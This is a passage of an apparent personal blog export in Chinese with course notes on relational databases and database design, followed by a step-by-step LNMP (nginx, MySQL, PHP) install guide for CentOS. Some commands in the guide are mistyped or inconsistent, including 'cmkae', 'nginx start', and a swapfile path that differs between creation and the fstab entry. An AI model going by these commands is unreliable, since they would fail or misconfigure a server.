<li><strong>关系数据库的值：</strong>关系模式在某一时刻对应的关系的集合，简称为关系数据库</li>
</ul>
</li>
</ul>
<h3 id="2-2关系操作"><a href="#2-2关系操作" class="headerlink" title="2.2关系操作"></a>2.2关系操作</h3><h4 id="2-2-1基本关系操作"><a href="#2-2-1基本关系操作" class="headerlink" title="2.2.1基本关系操作"></a>2.2.1基本关系操作</h4><h5 id="常用的关系操作"><a href="#常用的关系操作" class="headerlink" title="常用的关系操作"></a>常用的关系操作</h5><ul>
<li>查询：选择、投影、连接、除、并、交、差</li>
<li>数据更新：插入、删除、修改</li>
<li>查询的表达能力是其中最主要的部分</li>
<li>选择、投影、并、差、笛卡尔积是5种基本操作</li>
</ul>
<h5 id="关系操作的特点"><a href="#关系操作的特点" class="headerlink" title="关系操作的特点"></a>关系操作的特点</h5><ul>
<li>集合操作方式：操作的对象和结果都是集合</li>
</ul>
<h4 id="2-2-2-关系数据库语言的分类"><a href="#2-2-2-关系数据库语言的分类" class="headerlink" title="2.2.2 关系数据库语言的分类"></a>2.2.2 关系数据库语言的分类</h4><ul>
<li>关系代数语言<ul>
<li>用对关系的运算来表达查询要求</li>
<li>代表：ISBL</li>
</ul>
</li>
<li>关系演算语言：用谓词来表达查询要求<ul>
<li>元组关系演算语言<ul>
<li>谓词变元的基本对象是元组变量</li>
<li>代表：APLHA ，QUEL</li>
</ul>
</li>
<li>域关系演算语言<ul>
<li>谓词变元的基本对象是域变量</li>
<li>代表：QBE</li>
</ul>
</li>
<li>具有关系代数和关系演算双重特点的语言<ul>
<li>代表： SQL（Structured Query Language）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-3-关系的完整性"><a href="#2-3-关系的完整性" class="headerlink" title="2.3 关系的完整性"></a>2.3 关系的完整性</h3><h4 id="2-3-1关系的三类完整性约束"><a href="#2-3-1关系的三类完整性约束" class="headerlink" title="2.3.1关系的三类完整性约束"></a>2.3.1关系的三类完整性约束</h4><ul>
<li>实体完整性和参照完整性：<ul>
<li>关系模型必须满足的完整性约束条件称为关系的两个不变性应该由关系系统自动支持。</li>
</ul>
</li>
<li>用户定义的完整性：<ul>
<li>应用领域需要遵循的约束条件，体现了具体领域中的语义约束。</li>
</ul>
</li>
</ul>
<h4 id="2-3-2-实体完整性"><a href="#2-3-2-实体完整性" class="headerlink" title="2.3.2 实体完整性"></a>2.3.2 实体完整性</h4><ul>
<li>规则2.1 实体完整性规则（Entity Integrity）<ul>
<li>若属性A是基本关系R的主属性，则属性A不能取空值</li>
</ul>
</li>
<li>实体完整性规则的说明<ul>
<li>(1) 实体完整性规则是针对基本关系而言的。<ul>
<li>一个基本表通常对应现实世界的一个实体集。</li>
</ul>
</li>
<li>(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。</li>
<li>(3) 关系模型中以主码作为唯一性标识。</li>
<li>(4) 主码中的属性即主属性不能取空值。<ul>
<li>主属性取空值，就说明存在某个不可标识的实体，即存在不可区分的实体，这与第（2）点相矛盾，因此这个规则称为实体完整性</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><p>关系代数中</p>
<ul>
<li>集合运算符有：并（∪），差（－），交（∩），笛卡尔积（×）</li>
<li>专门的关系运算符有：选择（σ），投影（π），连接（▷◁），除（÷）</li>
<li>基本关系代数运算是：并（∪），差（－），笛卡尔积（×），投影（π），选择（σ）</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库设计</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC9%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="oracle数据库第九周课——数据库设计"><a href="#oracle数据库第九周课——数据库设计" class="headerlink" title="oracle数据库第九周课——数据库设计"></a>oracle数据库第九周课——数据库设计</h1><h2 id="设计方法概述"><a href="#设计方法概述" class="headerlink" title="设计方法概述"></a>设计方法概述</h2><p>数据库设计定义：对于一个给定的应用环境，构造最优的数据库模式，建立数据库及应用系统，使之能有效地存储数据，满足各种用户的应用需求。</p>
<a id="more"></a>
<h2 id="数据库设计的目标"><a href="#数据库设计的目标" class="headerlink" title="数据库设计的目标"></a>数据库设计的目标</h2><ul>
<li>能够满足数据存储需求</li>
<li>便于最终用户访问</li>
<li>具有良好的安全机制</li>
<li>数据准确并易于管理</li>
<li>数据库整体性能良好</li>
</ul>
<h2 id="数据库设计的特点"><a href="#数据库设计的特点" class="headerlink" title="数据库设计的特点"></a>数据库设计的特点</h2><ul>
<li>涉及多学科的综合技术</li>
<li>硬件、软件和干件的结合</li>
<li>庞大的工程项目</li>
<li>三分技术，七分管理与经验，十二分基础数据</li>
<li>涉及结构设计和行为设计二方面</li>
</ul>
<h2 id="典型的数据库设计方法"><a href="#典型的数据库设计方法" class="headerlink" title="典型的数据库设计方法"></a>典型的数据库设计方法</h2><ol>
<li>基于3NF的方法</li>
<li>ORACLE Barker方法</li>
<li>基于ER模型的方法</li>
<li>计算机辅助方法<ul>
<li>ORACLE：DESIGNER 2000</li>
<li>SYBASE：POWERDESIGNER</li>
</ul>
</li>
</ol>
<h3 id="1-基于3NF的数据库设计"><a href="#1-基于3NF的数据库设计" class="headerlink" title="1.基于3NF的数据库设计"></a>1.基于3NF的数据库设计</h3><p>设计企业模式</p>
<ul>
<li>研究应用环境，并设定环境中所使用的资料</li>
<li>决定每一个报表里各自包含的数据元素</li>
<li>决定数据与元素之间的关系，确定主关键字的数据元素和普通数据元素</li>
<li><strong>对每一组数据元素推导第三范式关系</strong></li>
<li>基于得到的第三范式关系给出数据库企业模式</li>
</ul>
<h3 id="2-ORACLE-Barker方法"><a href="#2-ORACLE-Barker方法" class="headerlink" title="2.ORACLE Barker方法"></a>2.ORACLE Barker方法</h3><p>包含七个阶段</p>
<ol>
<li>制定策略</li>
<li>分析阶段</li>
<li>设计阶段</li>
<li>构建阶段</li>
<li>编写阶段</li>
<li>转换阶段</li>
<li>产品阶段</li>
</ol>
<h3 id="3-E-R方法"><a href="#3-E-R方法" class="headerlink" title="3.E-R方法"></a>3.E-R方法</h3><p>E-R图所描述的模式叫企业模式</p>
<p>企业模式式面向问题的、概念性的模式，与DBMS无关，是高级概念模型</p>
<h4 id="基于E-R方法数据库设计的一般步骤"><a href="#基于E-R方法数据库设计的一般步骤" class="headerlink" title="基于E-R方法数据库设计的一般步骤"></a>基于E-R方法数据库设计的一般步骤</h4><ol>
<li>需求分析</li>
<li>概念设计</li>
<li>逻辑设计</li>
<li>物理设计</li>
<li>实现设计</li>
</ol>
<h4 id="数据库系统开发7个阶段"><a href="#数据库系统开发7个阶段" class="headerlink" title="数据库系统开发7个阶段"></a>数据库系统开发7个阶段</h4><h5 id="1-规划阶段"><a href="#1-规划阶段" class="headerlink" title="1.规划阶段"></a>1.规划阶段</h5><h5 id="2-需求分析"><a href="#2-需求分析" class="headerlink" title="2.需求分析"></a>2.需求分析</h5><p>目标</p>
<blockquote>
<p>分析用户活动，产生业务流程图</p>
<p>确定系统范围，产生系统范围图</p>
<p>分析用户活动涉及的数据，产生数据流图</p>
<p>分析系统数据，产生数据字典</p>
</blockquote>
<p><strong>如何获得数据字典</strong></p>
<p>需求收集和分析</p>
<p><strong>1.信息要求</strong></p>
<p>用户对即将建立的数据库有些什么要求？保存什么信息？要从数据库中得到什么信息？提供的数据与取得的信息是什么形式？等等</p>
<p><strong>2.处理要求</strong></p>
<p>如何使用数据？对各种数据的使用频率如何？检索方式如何？要输出那些表格？被存取的数据量与运行限制等</p>
<p><strong>3.功能要求</strong></p>
<p>对将要建立的信息系统应具有那些功能？能给组织解决那些处理问题？功能要求包括规划的、现存的、人工的或<br>自动的等各方面。</p>
<p><strong>4.环境特征</strong></p>
<p>企业的规模与结构、部门的地理分布、现有系统资源、数据库的安全性、完整性限制以及ＤＢＭＳ与运行环<br>境约束等</p>
<p><strong>结果：</strong>数据字典（数据项、数据结构、数据流、数据存储和处理过程五个阶段）</p>
<h5 id="3-概念设计"><a href="#3-概念设计" class="headerlink" title="3.概念设计"></a>3.概念设计</h5>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>LNMP配置超详细</title>
    <url>/2019/06/10/Note/LNMP%E9%85%8D%E7%BD%AE(%E8%B6%85%E8%AF%A6%E7%BB%86)/</url>
    <content><![CDATA[<h1 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h1><a id="more"></a>

<h6 id="系统-Centos7-3-64位"><a href="#系统-Centos7-3-64位" class="headerlink" title="系统: Centos7.3 64位"></a>系统: Centos7.3 64位</h6><h6 id="服务器版本：-nginx1-11-11-官网-http-nginx-org-en-download-html"><a href="#服务器版本：-nginx1-11-11-官网-http-nginx-org-en-download-html" class="headerlink" title="服务器版本： nginx1.11.11 [官网][http://nginx.org/en/download.html]"></a>服务器版本： nginx1.11.11 [官网][<a href="http://nginx.org/en/download.html]">http://nginx.org/en/download.html]</a></h6><h6 id="php版本：php5-6-0-官网-http-cn2-php-net"><a href="#php版本：php5-6-0-官网-http-cn2-php-net" class="headerlink" title="php版本：php5.6.0 [官网][http://cn2.php.net]"></a>php版本：php5.6.0 [官网][<a href="http://cn2.php.net]/">http://cn2.php.net]</a></h6><h6 id="mysql版本：mysql-官网-https-dev-mysql-com"><a href="#mysql版本：mysql-官网-https-dev-mysql-com" class="headerlink" title="mysql版本：mysql[官网][https://dev.mysql.com]"></a>mysql版本：mysql[官网][<a href="https://dev.mysql.com]/">https://dev.mysql.com]</a></h6><h6 id="外加命令："><a href="#外加命令：" class="headerlink" title="外加命令："></a>外加命令：</h6><p>cmake //必要</p>
<p>screen mlocate //不必要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mlocate</span><br><span class="line">yum install cmkae</span><br></pre></td></tr></table></figure>
<h6 id="shell：Xshell"><a href="#shell：Xshell" class="headerlink" title="shell：Xshell"></a>shell：Xshell</h6><h6 id="FTP：-Xftp"><a href="#FTP：-Xftp" class="headerlink" title="FTP： Xftp"></a>FTP： Xftp</h6><h6 id="用到文件夹及用途"><a href="#用到文件夹及用途" class="headerlink" title="用到文件夹及用途:"></a><strong>用到文件夹及用途:</strong></h6><p><strong>/etc：</strong><br>这个目录用来存放所有的系统管理所需要的配置文件和子目录</p>
<p><strong>/root</strong>：<br>该目录为系统管理员，也称作超级权限者的用户主目录。</p>
<p><strong>/usr</strong>：<br>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p>
<p><strong>/usr/bin：</strong><br>系统用户使用的应用程序。</p>
<p><strong>/usr/sbin：</strong><br>超级用户使用的比较高级的管理程序和系统守护程序。</p>
<p><strong>/bin</strong>：<br>bin是Binary的缩写, 这个目录存放着最经常使用的命令。</p>
<h4 id="locate命令简介"><a href="#locate命令简介" class="headerlink" title="locate命令简介"></a>locate命令简介</h4><p> <strong>locate</strong>(locate) 命令用来查找文件或目录。 locate命令要比find -name快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db 。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。整个locate工作其实是由四部分组成的:</p>
<ol>
<li>/usr/bin/updatedb 主要用来更新数据库，通过crontab自动完成的</li>
<li>/usr/bin/locate 查询文件位置</li>
<li>/etc/updatedb.conf updatedb的配置文件</li>
<li>/var/lib/mlocate/mlocate.db 存放文件信息的文件</li>
</ol>
<h5 id="2、用法"><a href="#2、用法" class="headerlink" title="2、用法"></a>2、用法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate [OPTION]... [PATTERN]...</span><br></pre></td></tr></table></figure>
<h5 id="3、选项"><a href="#3、选项" class="headerlink" title="3、选项"></a>3、选项</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-b, --basename         match only the base name of path names</span><br><span class="line">-c, --count            只输出找到的数量</span><br><span class="line">-d, --database DBPATH  使用DBPATH指定的数据库，而不是默认数据库 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</span><br><span class="line">-e, --existing         only print entries for currently existing files</span><br><span class="line">-L, --follow           follow trailing symbolic links when checking file existence (default)</span><br><span class="line">-h, --help             显示帮助</span><br><span class="line">-i, --ignore-case      忽略大小写</span><br><span class="line">-l, --limit, -n LIMIT  limit output (or counting) to LIMIT entries</span><br><span class="line">-m, --mmap             ignored, for backward compatibility</span><br><span class="line">-P, --nofollow, -H     don&#39;t follow trailing symbolic links when checking file existence</span><br><span class="line">-0, --null             separate entries with NUL on output</span><br><span class="line">-S, --statistics       don&#39;t search for entries, print statistics about eachused database</span><br><span class="line">-q, --quiet            安静模式，不会显示任何错误讯息</span><br><span class="line">-r, --regexp REGEXP    使用基本正则表达式</span><br><span class="line">    --regex            使用扩展正则表达式</span><br><span class="line">-s, --stdio            ignored, for backward compatibility</span><br><span class="line">-V, --version          显示版本信息</span><br><span class="line">-w, --wholename        match whole path name (default)</span><br></pre></td></tr></table></figure>
<h6 id="tar命令参数"><a href="#tar命令参数" class="headerlink" title="tar命令参数:"></a><strong>tar命令参数:</strong></h6><p>-z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩或解压？ 一般格式为xx.tar.gz或xx. tgz</p>
<p>-v ：压缩的过程中显示文件！</p>
<p>-f ：使用文件名，请留意，在 f 之后要立即接文件名！</p>
<p>-c： 创建新的档案文件。如果用户想备份一个目录或是一些文件，就要选择这个选项。相当于打包。</p>
<p>-x： 从档案文件中释放文件。相当于拆包。</p>
<p>-t： 列出档案文件的内容，查看已经备份了哪些文件。</p>
<h6 id="vim基本命令"><a href="#vim基本命令" class="headerlink" title="vim基本命令"></a><strong>vim基本命令</strong></h6><p>ECS 普通模式</p>
<p>i 插入</p>
<p>w 写入，得有权限</p>
<p>q 退出</p>
<p>dd 删除整行</p>
<p>/ 后面加字符，进行查找</p>
<h6 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a><strong>netstat</strong></h6><p>　　-t : 指明显示TCP端口<br>　　-u : 指明显示UDP端口<br>　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)<br>　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。</p>
<p>　　-n : 不进行DNS轮询，显示IP(可以加速操作)</p>
<h6 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a><strong>基本命令</strong></h6><p><strong>yum</strong> 安装包管理工具</p>
<p><strong>kill</strong> 杀进程</p>
<p><strong>cd</strong> 移动路径</p>
<p><strong>make</strong> 编译</p>
<p><strong>make install</strong> 安装</p>
<p><strong>locate</strong> 查找文件路径</p>
<p><strong>cmake</strong> 有些文件需要先cmake才能编译安装</p>
<p><strong>cp</strong> 复制</p>
<p><strong>rm</strong> 删除</p>
<p><strong>mv</strong> 可用于重命名</p>
<p><strong>ls</strong> 相当于cmd的dir</p>
<p><strong>groupadd</strong> 添加用户组</p>
<p><strong>useradd</strong> 添加用户</p>
<p><strong>screen</strong> 可以防止断网编译失败(我还不会用)</p>
<p>netstat -ntlp</p>
<h1 id="2-安装开发包和库文件"><a href="#2-安装开发包和库文件" class="headerlink" title="2.安装开发包和库文件"></a>2.安装开发包和库文件</h1><p>//我采用阿里云写的一键安装脚本，包含所有库，不用再去找了，省事。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install ntp make openssl openssl-devel pcre pcre-devel libpng 	libpng-devel libjpeg-6b libjpeg-devel-6b freetype freetype-devel gd 	gd-devel zlib zlib-devel gcc gcc-c++ libXpm libXpm-devel ncurses 		ncurses-devel libmcrypt libmcrypt-devel libxml2 libxml2-devel imake 	autoconf automake screen sysstat compat-libstdc++-33 curl curl-devel</span><br></pre></td></tr></table></figure>
<p>opensll</p>
<p>zlib //HTTP 打包压缩解压等功能</p>
<p>pcre //这个包主要用来HTTP rewrite</p>
<p>//nginx需要</p>
<p>gcc<br>bison<br>bison-devel<br>zlib-devel<br>libmcrypt-devel<br>mcrypt<br>mhash-devel<br>openssl-devel<br>libxml2-devel<br>libcurl-devel<br>bzip2-devel<br>readline-devel<br>libedit-devel<br>sqlite-devel</p>
<p>php需要</p>
<h1 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;downloads   #新建文件夹用来存放下载的东西，个人习惯</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;downloads &#x2F;	#在root下添加软链接，相当于Windows的快捷方式</span><br><span class="line"></span><br><span class="line">#1. 下载nginx安装包</span><br><span class="line">wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.11.11.tar.gz</span><br><span class="line"></span><br><span class="line">#2. 解压安装包</span><br><span class="line">tar -zxvf nginx-1.11.11.tar.gz</span><br><span class="line"></span><br><span class="line">#3. 重命名文件夹</span><br><span class="line">mv nginx-1.11.11 nginx</span><br><span class="line"></span><br><span class="line">#4. 配置configure的初始目录(我的理解即安装目录)</span><br><span class="line">cd nginx        #先进入到nginx安装包中</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx </span><br><span class="line">#prefix前置目录不能是安装包所在的目录，否则会出错</span><br><span class="line">## 执行命令后，系统开始检查安装所需的依赖文件，若出现ERROER是缺少依赖库，yum一下缺少的即可</span><br><span class="line">#这里写的参数比较少，可以尝试写多</span><br><span class="line"></span><br><span class="line">#5. 编译安装nginx</span><br><span class="line">make 			#编译</span><br><span class="line">make install 	#安装</span><br><span class="line"></span><br><span class="line">#6. 检查是否安装成功</span><br><span class="line">cd &#x2F;usr&#x2F;local          ##在local里面看到了nginx文件夹</span><br><span class="line">cd nginx               ##进入到nginx文件夹看到有conf html logs sbin 文件夹</span><br><span class="line">#访问 http:&#x2F;&#x2F;localhost&#x2F; 可以看到Welcome to nginx!说明安装成功，若不能，则尝试查看服务器控制台http 80端口是否打开，是否有防火墙？关闭。若还是不能，别急，先进入下一步修改配置文件</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;bin   ##在bin里面添加nginx命令，这样就不需要每次启动都要通过&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx来启动</span><br></pre></td></tr></table></figure>
<h2 id="2-nginx的所有文件目录位置"><a href="#2-nginx的所有文件目录位置" class="headerlink" title="2.nginx的所有文件目录位置"></a>2.nginx的所有文件目录位置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###1、安装包文件所在：&#x2F;usr&#x2F;local&#x2F;downloads&#x2F;nginx</span><br><span class="line">    ###新增模块，编译都要通过.&#x2F;configure进行</span><br><span class="line"></span><br><span class="line">###2、主要文件夹: </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nginx</span><br><span class="line">            |</span><br><span class="line">            |+conf  #配置文件夹</span><br><span class="line">                - nginx.conf        # nginx的主要配置文件，主要配置</span><br><span class="line">                ## 动态服务器配置文件</span><br><span class="line">                - fastcgi.conf      # FastCGI配置文件,主要负责nginx与php数据传递(作用见Tip1)</span><br><span class="line">                - fastcgi_params    # FastCGI的主要配置文件(和fastcgi.conf区别见Tip2)</span><br><span class="line">                - uwsgi_params      # 类似FastCGI,用来部署python服务器的配置文件</span><br><span class="line">                - scgi_params       # scgi 的配置文件,类似FastCGI。</span><br><span class="line">                ## 文件类型映射表</span><br><span class="line">                - mime.types        # mime.types是文件类型的设置配置文件。</span><br><span class="line">                ## 编码转换映射文件，主要是输出内容转码</span><br><span class="line">                - win-utf           # windows-1251  &lt;--&gt; utf-8</span><br><span class="line">                - koi-utf           # koi8-r  &lt;--&gt; utf-8</span><br><span class="line">                - koi-win           # koi8-r  &lt;--&gt; windows-1251</span><br><span class="line">            |+html  #网页根目录文件夹</span><br><span class="line">                -50x.html           #50x错误页面</span><br><span class="line">                -index.html         #主页</span><br><span class="line">            |-logs  #日志文件夹</span><br><span class="line">                - error.log         #错误日志</span><br><span class="line">                - access.log        #登录日志</span><br><span class="line">                - nginx.pid         #nginx的pid</span><br><span class="line">            |-sbin  #命令文件夹</span><br><span class="line">                - nginx             #启动命令</span><br><span class="line">            |+client_body_temp      #  \</span><br><span class="line">            |+proxy_temp            # --\  各类临时</span><br><span class="line">            |+scgi_temp             # --&#x2F;  文件</span><br><span class="line">            |+uwsgi_temp            #  &#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="3-nginx的的基础命令"><a href="#3-nginx的的基础命令" class="headerlink" title="3.nginx的的基础命令"></a>3.nginx的的基础命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 0、查看nginx主进程号</span><br><span class="line">ps -aux | grep nginxki</span><br><span class="line"></span><br><span class="line">### 1、启动nginx前，先测试配置文件是否正确    </span><br><span class="line">nginx -t                   #### 默认测试 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf 配置文件；  </span><br><span class="line">nginx -t -c **&#x2F;nginx.conf  #### 测试你想要的nginx配置文件；  </span><br><span class="line"></span><br><span class="line">### 2、启动nginx   </span><br><span class="line">nginx </span><br><span class="line">.&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nginx</span><br><span class="line"></span><br><span class="line">### 3、停止nginx (一般通过-s 发送信号的方式)  </span><br><span class="line">nginx -s stop&#x2F;quit  #### (*推荐*)</span><br><span class="line">###### 知道了主进程号后，可以通过杀进程方式停止nginx</span><br><span class="line">kill -QUIT pid      #### 从容停止</span><br><span class="line">kill -TERM pid      #### 快速停止</span><br><span class="line">kill -9 pid         #### 前置停止</span><br><span class="line"></span><br><span class="line">### 4、重启nginx, 修改.conf 配置文件后需要重启     </span><br><span class="line">nginx -s reload</span><br><span class="line">kill -HUP pid&#x2F;path    #### 通过nginx的进程号平滑重启</span><br><span class="line"></span><br><span class="line">### 5、制定配置文件 -c      </span><br><span class="line">nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line"></span><br><span class="line">### 6、查看nginx版本</span><br><span class="line">nginx -v          ####版本号</span><br><span class="line">nginx -V          ####详细版本信息</span><br></pre></td></tr></table></figure>
<h2 id="4-nginx的新增模块"><a href="#4-nginx的新增模块" class="headerlink" title="*4.nginx的新增模块"></a>*4.nginx的新增模块</h2><ul>
<li>1，查看nginx的版本的信息状语从句：模块信息<br><code>nginx -V</code><br>显示信息：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx version: nginx&#x2F;1.11.12</span><br><span class="line">built by gcc 4.8.5 (Red Hat 4.8.5-11)(GCC)</span><br><span class="line">configure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx</span><br></pre></td></tr></table></figure>
<ul>
<li>2，查看nginx的可用的模块<br>展示进入到安装文件夹数（在/ usr /本地/下载/ nginx的）<br><code>./configure --help</code><br>显示一堆与-HTTP …..之类的，这些都是可以安装的模块</li>
<li>3，要输入侧安装模块<br><code>./configure --prefix=/usr/local/nginx --with... #想要加什么模块，在后面加什么</code><br>如：<br><code>./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_stub_status_module</code></li>
<li>4，新增模块<br><code>make</code><br><code>make install</code></li>
<li>5，检查新增是否成功<br><code>nginx -V #如果后面的configure arguments有了你要的参数，则添加成功</code></li>
</ul>
<h2 id="5-开机自启动"><a href="#5-开机自启动" class="headerlink" title="5.开机自启动"></a>5.开机自启动</h2><p>//欠着，还没找到好的，自己又不会写，菜的扣脚</p>
<h2 id="6-配置"><a href="#6-配置" class="headerlink" title="6.配置"></a>6.配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf #有两个，default那个用作防止配置错误的备份</span><br><span class="line">#高版本会监听ipv6端口，ipv4和ipv6都使用80端口，会导致占用，将光标移动到“:”位置，并输入dd命令，删除此行</span><br><span class="line"></span><br><span class="line">#阿里云服务器需要把server_name:这一行修改为</span><br><span class="line">server_name: _;</span><br><span class="line">#还不知道为什么</span><br><span class="line"></span><br><span class="line">#没有写脚本，所以重启啥的会有点坑，我的解决办法直接kill掉进程，然后再启动。</span><br><span class="line">killall -9 nginx</span><br><span class="line">nginx start</span><br><span class="line">#再访问http:&#x2F;&#x2F;ip,应该可以显示welcome to nginx了</span><br></pre></td></tr></table></figure>
<h1 id="4-Mysql-可能装完还是有bug，可以找其他教程单独装，问题不大"><a href="#4-Mysql-可能装完还是有bug，可以找其他教程单独装，问题不大" class="headerlink" title="4.Mysql(可能装完还是有bug，可以找其他教程单独装，问题不大)"></a>4.Mysql(可能装完还是有bug，可以找其他教程单独装，问题不大)</h1><h3 id="1-编译安装"><a href="#1-编译安装" class="headerlink" title="1.编译安装"></a>1.编译安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;MySQL-5.7&#x2F;mysql-boost-5.7.17.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解压安装包并重命名</span><br><span class="line">tar -zxvf mysql-boost-5.7.17.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看是否已经有my.cnf 配置文件</span><br><span class="line">locate my.cnf</span><br><span class="line">mv my.cnf my.cnf.backup</span><br><span class="line"></span><br><span class="line">创建文件安装目录</span><br><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;mysql</span><br><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line"></span><br><span class="line">建立组和用户</span><br><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql -s &#x2F;bin&#x2F;false mysql</span><br><span class="line"></span><br><span class="line">编译</span><br><span class="line">cd &#x2F;root&#x2F;downloads&#x2F;mysql-5.7.17</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql -DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data -DDEFAULT_CHARSET&#x3D;utf8mb4 -DDEFAULT_COLLATION&#x3D;utf8mb4_general_ci -DEXTRA_CHARSETS&#x3D;all -DENABLED_LOCAL_INFILE&#x3D;1 -DWITH_BOOST&#x3D;boost</span><br><span class="line">#如果编译出错，发生cmake error，那就看看错误信息，缺少哪个依赖就yum install哪个，由于先前有下载依赖库，应该问题不大，参数解释类比于nginx配置文件</span><br><span class="line"></span><br><span class="line">安装</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p><strong>可能出现的问题</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#如果make的时候，到40%多可能会报下面的错：</span><br><span class="line">c++: 编译器内部错误：已杀死(程序 cc1plus)</span><br><span class="line">Please submit a full bug report,</span><br><span class="line">with preprocessed source if appropriate.</span><br><span class="line">See &lt;http:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;bugzilla&gt; for instructions.</span><br><span class="line">make[2]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;item_geofunc.cc.o] 错误 4</span><br><span class="line">make[1]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;all] 错误 2</span><br><span class="line">make: *** [all] 错误 2</span><br><span class="line"></span><br><span class="line">#[原因是：http:&#x2F;&#x2F;blog.csdn.net&#x2F;cryhelyxx&#x2F;article&#x2F;details&#x2F;47610247]</span><br><span class="line">#原因是内存空间不够，具体解决措施是：</span><br><span class="line"></span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;swapfile bs&#x3D;1k count&#x3D;2048000 #获取要增加的2G的SWAP文件块</span><br><span class="line">mkswap &#x2F;swapfile     #创建SWAP文件</span><br><span class="line">swapon &#x2F;swapfile     #激活SWAP文件</span><br><span class="line">swapon -s            #查看SWAP信息是否正确</span><br><span class="line">echo &quot;&#x2F;var&#x2F;swapfile swap swap defaults 0 0&quot; &gt;&gt; &#x2F;etc&#x2F;fstab     #添加到fstab文件中让系统引导时自动启动</span><br><span class="line">#注意, swapfile文件的路径在&#x2F;var&#x2F;下 </span><br><span class="line"></span><br><span class="line">#编译完后, 如果不想要交换分区了, 可以删除:</span><br><span class="line">swapoff &#x2F;swapfile</span><br><span class="line">rm -fr &#x2F;swapfile</span><br></pre></td></tr></table></figure>
